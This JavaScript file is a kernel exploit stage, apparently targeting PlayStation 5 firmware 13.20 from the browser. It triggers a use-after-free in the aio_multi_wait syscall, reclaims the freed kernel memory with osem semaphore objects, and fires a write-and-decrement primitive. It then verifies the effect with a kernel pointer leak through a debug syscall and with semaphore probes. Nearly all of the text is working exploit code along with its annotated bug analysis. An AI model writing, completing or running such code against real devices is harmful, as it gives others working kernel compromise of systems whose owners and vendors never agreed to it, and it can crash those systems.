// bagagwa_uaf_1320.js — BAGAGWA: fires the deterministic UAF (aio_multi_wait mode 0).
// Spec: "Bagagwa Multi Chain Exploit". This version FIRES the bug (UAF phase)
// and measures its effect from the KERNEL side (727 leak + osem probe); the
// userland blocks are informational tripwires only.
//
// BUG IDEA (syscall 663 = aio_multi_wait, body 0x805c0210):
//   The waiters array is cached at [rbx+0x40] and walked with add r14,0x38.
//   With num>=2 and mode 0, the dispatch (0x805c08e5) does rcx = [rbx+0x40]
//   WITHOUT indexing: the SAME node (element 0) is linked onto the lists of
//   all N requests, overwriting node->owner (+0x18) each iteration. The
//   cleanup (0x805c0da1) unlinks through node->owner -> it is removed only
//   from the LAST request; when the array is freed (0x805c0f93) requests
//   0..N-2 keep req->waiters pointing at freed memory (UAF).
//
//   The waker (0x805c1d2d) is the write primitive:
//     mov [r15+0x20], eax      ; controlled 32-bit write
//     mov rdi,[r15+0x10]; +0x18; mtx_lock  ; lock on controlled pointer
//     mov rax,[r15]
//     dec [rax]                ; arbitrary 32-bit decrement #1
//     mov rax,[r15+8]
//     test rax,rax / dec [rax] ; decrement #2 (mode 0 leaves it M_ZERO -> freed)
//
// Real ABI (confirmed in lapse.js and osem2_1320.js):
//   aio_multi_wait(ids*, num_ids, states*, mode, timeout)   [0x297]
//   aio_submit_cmd(cmd, reqs*, num_reqs, priority, ids*)    [0x29D]
//   aio_multi_cancel(ids*, num_ids, states*)                [0x29A]
//   aio_multi_delete(ids*, num_ids, states*)                [0x296]
//   aio_debug_request_info(id, dst*, ?)                     [0x2D7 = 727]
//   osem_create(name*,attr,val,max,opt*) [0x225] osem_delete(id) [0x226]
//   osem_trywait(id) [0x22A]  osem_post(id) [0x22B]   (osem2_1320.js)
//   AIO_CMD_MULTI_READ = 0x1001
//
// DETECTION — KERNEL-SIDE CHANNELS ONLY (the only valid ones: the freed
// array and the reclaim objects live in kernel zone 128, unreadable from
// userland):
//   A) PER-REQUEST 727 LEAK: 0x2D7 copies request info (kernel pointers)
//      into our own buffer -> legitimate kernel read. Snapshot before the
//      shot vs after the wake: if the waiters pointers change / point into
//      the freed zone, the UAF is real. In stub mode 727 has NO C stub; it
//      is called via SYSCALL_RAW (syscall;ret gadget from WebKit, see bridge).
//   B) OSEM PROBE: osem_create post-UAF reclaims zone 128. Semaphore state
//      IS readable through trywait/post: protocol post(id)+trywait(id) ->
//      healthy = ok,ok; the waker touching the struct alters the sequence
//      (EBUSY/EINVAL). Compared against a CONTROL osem created BEFORE the
//      shot (it can never land in the freed zone) to rule out noise. Name
//      strings are strlcpy'd into the kernel struct -> re-reading them in
//      userland proves nothing: kept as a tripwire only.
//   C) userland tripwires (decTargets/witness): the kernel would only touch
//      them if a dangling-node pointer aimed at the process heap. Informational.
//
// PHASES:
//   0  ABI: AIO family answers + available channels
//   1  create N valid AIO requests (multi-read over a socketpair)
//   1b 727 leak snapshot per id (kernel-side baseline)
//   2  CONTROL osem (pre-shot) + userland tripwires
//   3  SHOT: aio_multi_wait(ids, N, states, mode=0, timeout=0)
//   4  kernel reclaim (osem_create x4, zone 128) + pre-wake probe
//   5  WAKE: write(1B) -> pending reads complete -> the waker runs
//   6  post-wake 727 leak + osem re-probe (control vs reclaimed)
//   7  verdict + cleanup
//
// Logging: bridge log() -> #scr + panel + remote log.
// DESTRUCTIVE: phase 3+ can hang/panic the console. Stops on the last visible line.
(() => {
    const B = (x) => BigInt(x);
    const I = (x) => BigInt.asIntN(64, x);
    const Y = 331n; // sched_yield

    const say = (s) => { try { log("[bagagwa] " + s); } catch (e) {} };
    const notif = (s) => { try { send_notification(("[bagagwa] " + s).slice(0, 120)); } catch (e) {} };
    const EN = () => { try { const m = /^(\d+)/.exec(get_error_string()); return m ? parseInt(m[1], 10) : -1; } catch (e) { return -1; } };
    const ENX = { 1: "EPERM", 2: "ENOENT", 9: "EBADF", 12: "ENOMEM", 14: "EFAULT",
        16: "EBUSY", 17: "EEXIST", 22: "EINVAL", 35: "EAGAIN/EBUSY", 78: "ENOSYS", 93: "ENOTCAPABLE" };
    const J = (e) => " errno=" + e + "(" + (ENX[e] || "?") + ")";
    const FX = (v) => "0x" + B(v).toString(16);
    const VS = (q) => q.ex ? "EX(" + q.msg + ")" : (q.r >= 0n ? "ok0x" + q.r.toString(16) : "e" + q.e + (ENX[q.e] ? "(" + ENX[q.e] + ")" : ""));
    const VIVA = (q) => !q.ex && !(q.r === -1n && q.e === 78);

    const SC = (tag, sc, args, desc) => {
        const p = tag + (desc ? " " + desc : "") + " (" + args.map(FX).join(",") + ")";
        say(p + " ...");
        const o = { tag, r: -9999n, e: -1, ex: false, msg: "" };
        try { o.r = I(syscall(sc, ...args.map((a) => B(a)))); if (o.r < 0n) o.e = EN(); }
        catch (err) { o.ex = true; o.msg = String(err && err.message || err).slice(0, 60); say(p + " -> THREW " + o.msg); return o; }
        say(p + " -> " + (o.r >= 0n ? "ret=0x" + o.r.toString(16) + " OK" : o.r + J(o.e)));
        return o;
    };

    // ABI
    const A_INIT = 0x29En, A_SUBMIT = 0x295n, A_SUBCMD = 0x29Dn;
    const A_WAIT = 0x297n, A_CANCEL = 0x29An, A_DEL = 0x296n;
    const A_DEBUG = 0x2D7n;
    const O_CREATE = 0x225n, O_DELETE = 0x226n, O_TRYWAIT = 0x22An, O_POST = 0x22Bn;
    const AIO_CMD_MULTI_READ = 0x1001n;

    // Number of requests. Spec: num>=2, mode 0 -> all requests get node 0.
    const NREQ = 2;
    const NODE_BYTES = 0x38;   // waiter node size
    const REQ_BYTES = 0x28;    // request size (lapse make_reqs1)
    const NRECLAIM = 4;

    say("begin - Bagagwa UAF (aio_multi_wait mode 0) pid=" + I(syscall(SYSCALL.getpid))
        + " fw=" + (PS5.fw || "?") + " mode=" + (PS5.mode || "?"));

    // ===== PHASE 0: AIO family answers + available channels =====
    say("F0: AIO family ABI check");
    let leakOK = true;   // the 727 channel stays enabled unless proven otherwise
    // [X1NON mods] in stub mode, pre-check the stubs we are about to use.
    if (PS5.stubMode) {
        const stubs = (typeof SYSCALL_STUBS !== "undefined" && SYSCALL_STUBS)
            ? SYSCALL_STUBS : null;
        if (!stubs) {
            say("VERDICT: stubMode active without the SYSCALL_STUBS table -> abort.");
            return;
        }
        const need = [[663, "aio_multi_wait"], [669, "aio_submit_cmd"],
            [662, "aio_multi_delete"], [666, "aio_multi_cancel"], [20, "getpid"],
            [549, "osem_create"], [550, "osem_delete"],
            [554, "osem_trywait"], [555, "osem_post"]];
        const miss = need.filter(([n]) => !stubs[String(n)]);
        if (miss.length) {
            say("VERDICT: missing stubs: "
                + miss.map(([n, nm]) => nm + "(" + n + ")").join(",") + " -> abort.");
            notif("bagagwa: missing stubs, aborting");
            return;
        }
        // 727 has no C wrapper: callable only via SYSCALL_RAW (the bridge found
        // syscall;ret + pop r10 in WebKit). Without raw, channel A) drops out.
        const raw = (typeof SYSCALL_RAW !== "undefined" && SYSCALL_RAW)
            || (PS5.rawSyscall === true);
        say("F0 stubs OK; 727 via raw=" + (raw ? "YES" : "NO (no SYSCALL_RAW -> leak channel disabled)"));
        if (!raw) leakOK = false;
    }
    const qInit = SC("AIO_INIT_0x29e", A_INIT, [0n], "(flags=0)");
    const qSubmit = SC("AIO_SUBMIT_0x295", A_SUBMIT, [0n, 0n, 0n], "(0,0,0)");
    const qWait = SC("AIO_WAIT_0x297", A_WAIT, [0n, 0n, 0n, 0n, 0n], "(0,0,0,mode0,0)");
    say("F0 gate: init=" + VS(qInit) + " submit=" + VS(qSubmit) + " wait=" + VS(qWait));
    if (!VIVA(qInit) && !VIVA(qSubmit) && !VIVA(qWait)) {
        say("VERDICT: AIO DEAD (full ENOSYS) -> Bagagwa unreachable; aborting without firing.");
        notif("bagagwa: AIO dead, chain unreachable");
        return;
    }

    // 727 leak helper: copies kernel info about request id into buffer dst
    const leakBuf = malloc(32);
    const leak727 = (id, phase) => {
        if (!leakOK) return null;
        const q = SC("AIO_DEBUG727_" + phase, A_DEBUG, [B(id), leakBuf, 0n],
            "(id=" + FX(id) + ",dst)");
        if (q.ex) { leakOK = false; return null; }
        if (q.r < 0n) {
            if (q.e === 78) leakOK = false;   // missing: switch the channel off
            return null;
        }
        return [read64(leakBuf), read64(leakBuf + 8n), read64(leakBuf + 16n)];
    };

    // ===== PHASE 1: create N valid AIO requests =====
    // The fd must have a PENDING read (keeps the request alive with waiters,
    // like lapse does with sockets). fd=0 does not exist in the browser
    // sandbox -> socketpair(AF_UNIX) and read from the empty end.
    say("F1: create " + NREQ + " AIO requests (multi-read, pending read)");
    const reqs = malloc(REQ_BYTES * NREQ);
    let fdTarget = 0n, fdPair = -1n;
    const sv = malloc(8);
    const qsp = SC("SOCKETPAIR_0x35", 0x35n, [1n, 1n, 0n, sv], "(AF_UNIX,SOCK_STREAM,0,sv)");
    if (qsp.r >= 0n) {
        fdTarget = BigInt(Number(read32(sv)));
        fdPair = Number(read32(sv + 4n));
        say("F1 socketpair ok: fdA=" + fdTarget + " fdB=" + fdPair + " (pending read)");
    } else {
        say("F1 socketpair failed (" + VS(qsp) + ") -> fallback fd=0 (likely EBADF on submit)");
    }
    for (let i = 0; i < NREQ; i++) write32(reqs + BigInt(i * REQ_BYTES + 0x20), fdTarget);
    const ids = malloc(4 * NREQ);
    for (let i = 0; i < NREQ; i++) write32(ids + BigInt(i * 4), 0n);
    const states = malloc(4 * NREQ);
    for (let i = 0; i < NREQ; i++) write32(states + BigInt(i * 4), 0n);

    const sub = SC("AIO_SUBMIT_CMD", A_SUBCMD,
        [AIO_CMD_MULTI_READ, reqs, B(NREQ), 3n, ids], "(MULTI_READ,reqs," + NREQ + ",prio3,ids)");
    const idList = [];
    for (let i = 0; i < NREQ; i++) {
        const r = Number(read32(ids + BigInt(i * 4)));
        idList.push(r);
        say("F1 id[" + i + "] = " + FX(r));
    }
    say("F1 submit=" + VS(sub) + " ids=" + idList.map(FX).join(","));

    // ===== F1b: 727 leak baseline (kernel-side, BEFORE the shot) =====
    const leakPre = idList.map((id, i) => {
        const r = leak727(id, "F1b[" + i + "]");
        if (r) say("F1b pre leak id[" + i + "]=" + r.map(FX).join(","));
        return r;
    });
    if (!leakOK) say("F1b: 727 channel unavailable (" + (PS5.stubMode ? "no SYSCALL_RAW" : "727 not operative") + ") -> detection via osem probe only");

    // ===== PHASE 2: CONTROL osem + userland tripwires =====
    say("F2: CONTROL osem (pre-shot) + userland tripwires");
    // The CONTROL is created BEFORE the shot: it can never land in the zone
    // that gets freed in F3, so its post-wake probe is an honest baseline.
    const ctrlNm = alloc_string("CTRL0000");
    const qCtrl = SC("OSEM_CREATE_CTRL", O_CREATE, [ctrlNm, 0n, 1n, 1n, 0n], "(control val=1)");
    const ctrlId = qCtrl.r >= 0n ? qCtrl.r : null;
    // Userland tripwires: only useful if a dangling-node pointer happened to
    // aim at the process heap (not expected: after the reclaim node[] holds
    // osem-struct kernel data). NOT the primary channel.
    const decTarget1 = malloc(8), decTarget2 = malloc(8);
    write64(decTarget1, 0x4141414141414141n);
    write64(decTarget2, 0x4242424242424242n);
    const mtxCell = malloc(8);
    write64(mtxCell, 0n);
    const node = malloc(NODE_BYTES);
    write64(node + 0x00n, decTarget1);
    write64(node + 0x08n, decTarget2);
    write64(node + 0x10n, mtxCell);
    write32(node + 0x20n, 0x13371337n);
    say("F2 ctrlId=" + (ctrlId === null ? "FAILED(" + VS(qCtrl) + ")" : FX(ctrlId))
        + " tripwires dec1=" + FX(decTarget1) + " dec2=" + FX(decTarget2));

    // osem probe: post(id)+trywait(id). Healthy = ok,ok. Returns the trywait
    // code (0 = consumed ok; 35 = EBUSY value exhausted/corrupted; 22 = EINVAL).
    const probe = (tag, id) => {
        const qp = SC("OSEM_POST_" + tag, O_POST, [id], "(id=" + FX(id) + ")");
        const qt = SC("OSEM_TRYWAIT_" + tag, O_TRYWAIT, [id], "(id=" + FX(id) + ")");
        return { post: qp, tw: qt, code: qt.ex ? -100 : (qt.r >= 0n ? 0 : qt.e) };
    };
    const ctrlPre = ctrlId === null ? null : probe("CTRL_pre", ctrlId);
    say("F2 CTRL probe pre-wake: post=" + (ctrlPre ? VS(ctrlPre.post) : "-")
        + " trywait=" + (ctrlPre ? VS(ctrlPre.tw) : "-"));

    // ===== PHASE 3: UAF SHOT =====
    // aio_multi_wait(ids, NREQ, states, mode=0, timeout=0). With mode 0 and
    // num>=2 the same node is linked N times and only unlinked from the last;
    // the array is freed with requests still dangling. timeout=0 => no block.
    say("F3: SHOT aio_multi_wait(ids," + NREQ + ",states,mode=0,timeout=0)");
    notif("bagagwa: firing aio_multi_wait mode 0");
    const det = SC("AIO_WAIT_MODE0", A_WAIT, [ids, B(NREQ), states, 0n, 0n], "(ids,N,states,mode0,0)");
    say("F3 result: " + VS(det) + "  <- if the console is alive, the UAF did not panic");
    for (let i = 0; i < 200; i++) { try { syscall(Y); } catch (e) {} }

    // ===== PHASE 4: KERNEL-side reclaim with osem (zone 128) =====
    // The waiters array (0x70, num=2) was freed in the KERNEL 128 zone.
    // Only kernel allocs can reclaim it: osem_create does malloc(0x60,
    // M_osem) = 128 zone (same zone, per the spec). The pre-wake probe of
    // each reclaimed osem fixes its baseline right before the wake.
    say("F4: kernel reclaim (osem_create x" + NRECLAIM + ", zone 128) + pre-wake probe");
    const osemIds = [], osemNames = [], probePre = [];
    for (let i = 0; i < NRECLAIM; i++) {
        const tag = "WAKE000" + i;
        const nmp = alloc_string(tag);
        osemNames.push({ tag, ptr: nmp, orig: read64(nmp) });
        const q = SC("OSEM_CREATE", O_CREATE, [nmp, 0n, 1n, 1n, 0n], "(reclaim " + tag + ")");
        if (q.r >= 0n) {
            osemIds.push(q.r);
            probePre.push(probe("REC" + i + "_pre", q.r));
        } else probePre.push(null);
    }
    for (let i = 0; i < 500; i++) { try { syscall(Y); } catch (e) {} }
    say("F4 pre-wake probes reclaimed: " + probePre.map((p, i) => "R" + i
        + "=" + (p ? VS(p.tw) : "n/a")).join(" "));

    // ===== PHASE 5: WAKE - complete the pending reads =====
    // The waker (0x805c1d2d: write + mtx_lock + dec x2) runs when a request
    // COMPLETES. We write 1 byte to the other socketpair end -> the pending
    // reads complete -> the kernel walks req->waiters (dangling in the
    // freed/reclaimed zone) and executes the primitive.
    say("F5: WAKE - write(1B) to the other socketpair end to complete the reads");
    const wakeBuf = malloc(4);
    write8(wakeBuf, 0x57); // 'W'
    let woken = "no fd";
    if (fdPair >= 0n) {
        const qw = SC("WAKE_WRITE", 0x4n, [fdPair, wakeBuf, 1n], "(fdB,1 byte)");
        woken = VS(qw);
    }
    say("F5 wake=" + woken + " <- a panic/hang here means the waker hit the dangling node");
    for (let i = 0; i < 500; i++) { try { syscall(Y); } catch (e) {} }

    // ===== PHASE 6: read the KERNEL state post-wake =====
    // A) 727 re-leak: the pointers must be identical if nothing touched the
    //    list; a dangling/reclaimed waiters changes what 727 copies.
    const leakPost = idList.map((id, i) => {
        const r = leak727(id, "F6[" + i + "]");
        if (r) say("F6 post leak id[" + i + "]=" + r.map(FX).join(","));
        return r;
    });
    let leakDiff = "";
    for (let i = 0; i < idList.length; i++) {
        const a = leakPre[i], b = leakPost[i];
        if (a && b && (a[0] !== b[0] || a[1] !== b[1] || a[2] !== b[2]))
            leakDiff += "id" + i + " " + a.map(FX).join(",") + " -> " + b.map(FX).join(",") + "; ";
    }
    // B) osem re-probe: CONTROL sets the baseline; a RECLAIMED one deviating
    //    => the waker wrote over the reclaimed osem struct.
    const ctrlPost = ctrlId === null ? null : probe("CTRL_post", ctrlId);
    const ctrlBase = ctrlPre ? ctrlPre.code : -1;
    const ctrlNow = ctrlPost ? ctrlPost.code : -1;
    const ctrlDrift = ctrlPre && ctrlPost && ctrlNow !== ctrlBase;
    const recPost = [];
    for (let i = 0; i < osemIds.length; i++) {
        const p = probe("REC" + i + "_post", osemIds[i]);
        const was = probePre[i] ? probePre[i].code : -1;
        recPost.push({ tag: "WAKE000" + i, code: p.code, was, p });
        say("F6 probe " + "WAKE000" + i + ": pre=" + was + " post=" + p.code
            + " post:" + VS(p.post) + " tw:" + VS(p.tw));
    }
    const recHit = recPost.filter((r) => r.code !== r.was);
    // C) userland tripwires (informational)
    const nameChanges = [];
    for (const nm of osemNames) {
        try {
            const now = read64(nm.ptr);
            if (now !== nm.orig) nameChanges.push(nm.tag + "=" + FX(now));
        } catch (e) { nameChanges.push(nm.tag + "=FAULT"); }
    }
    const post1 = read64(decTarget1), post2 = read64(decTarget2);
    const decHit = (post1 !== 0x4141414141414141n) || (post2 !== 0x4242424242424242n);
    say("F6 leakDiff=" + (leakDiff || "no") + " | CTRL pre=" + ctrlBase + " post=" + ctrlNow
        + (ctrlDrift ? " (DRIFT!)" : ""));
    say("F6 tripwires: dec=" + FX(post1) + "/" + FX(post2)
        + " names=" + (nameChanges.length ? nameChanges.join(" ") : "unchanged"));

    // ===== PHASE 7: verdict + cleanup =====
    let v;
    if (det.ex) v = "FAILED: aio_multi_wait mode0 THREW (" + det.msg + ")";
    else if (det.r < 0n && det.e === 78) v = "aio_multi_wait ENOSYS -> not present in this sandbox";
    else if (decHit) v = "PRIMITIVE HIT: dec reached userland tripwires (dec1=" + FX(post1) + " dec2=" + FX(post2) + ")";
    else if (recHit.length && !ctrlDrift) v = "KERNEL EFFECT (osem probe): "
        + recHit.length + "/" + osemIds.length + " reclaimed osems altered ["
        + recHit.map((r) => r.tag + " " + r.was + "->" + r.code).join(", ") + "]"
        + " (control stable " + ctrlBase + "->" + ctrlNow + ")"
        + (leakDiff ? " | 727 leak: " + leakDiff : "");
    else if (leakDiff) v = "KERNEL EFFECT (727 leak): request kernel pointers changed after the wake: " + leakDiff;
    else if (ctrlDrift) v = "NOISE: the CONTROL osem changed too (" + ctrlBase + "->" + ctrlNow + ") -> probe unreliable on this kernel";
    else v = "NO OBSERVABLE EFFECT (latent UAF; channels: osem=stable"
        + (leakOK ? ", 727=no diff" : ", 727=unavailable") + ")";
    say("VERDICT: " + v);
    notif(("bagagwa: " + v).slice(0, 120));
    // Cleanup. NOTE: the reclaim osems are deliberately left ALIVE — if the
    // waker touched their refcount, osem_delete would be a double-free. The
    // CONTROL is deleted (it could never be in the freed zone).
    SC("AIO_MULTI_CANCEL", A_CANCEL, [ids, B(NREQ), states], "(ids,N,states)");
    SC("AIO_MULTI_DELETE", A_DEL, [ids, B(NREQ), states], "(ids,N,states)");
    if (ctrlId !== null) SC("OSEM_DELETE_CTRL", O_DELETE, [ctrlId], "(control)");
    if (fdTarget > 0n) { try { syscall(SYSCALL.close, fdTarget); } catch (e) {} }
    if (fdPair >= 0n) { try { syscall(SYSCALL.close, fdPair); } catch (e) {} }
    say("reclaim osems left alive (double-free safety): "
        + osemIds.map((i) => FX(i)).join(","));
    for (let i = 0; i < 8; i++) { notif(("bagagwa: " + v).slice(0, 100)); for (let j = 0; j < 1000; j++) { try { syscall(Y); } catch (e) {} } }
    say("PAYLOAD DONE");
})();
